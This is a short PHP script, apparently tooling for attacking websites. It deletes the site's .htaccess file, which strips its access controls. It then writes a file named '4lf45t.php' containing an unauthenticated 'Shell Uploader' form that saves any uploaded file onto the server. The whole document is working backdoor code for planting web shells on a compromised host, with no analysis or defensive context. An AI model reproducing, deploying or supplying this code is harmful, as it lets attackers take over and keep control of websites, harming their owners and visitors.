<?php
$htaFile = ".htaccess";
$path = getcwd();

if (file_exists($htaFile)) {
    if (unlink($htaFile)) {
        echo "Berhasil menghapus .htaccess!";
    } else {
        echo "Gagal menghapus .htaccess!";
    }
} else {
    echo "File .htaccess tidak ditemukan.";
}

echo "<br>Lokasi 4lf45t.php: $path/4lf45t.php";

$newFileName = fopen("4lf45t.php", "w") or die("Unable to open file!");
$inNewFile = '<?php 
echo "<b>Shell Uploader</b><br>";
if($_POST){
    if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){
        echo "Berhasil";
    }else{
        echo "Gagal";
    }
}else{
    echo "<form method=post enctype=multipart/form-data>
    <input type=file name=0><input name=0 type=submit value=Go!>";
}
?>';
fwrite($newFileName, $inNewFile);
fclose($newFileName);
?>
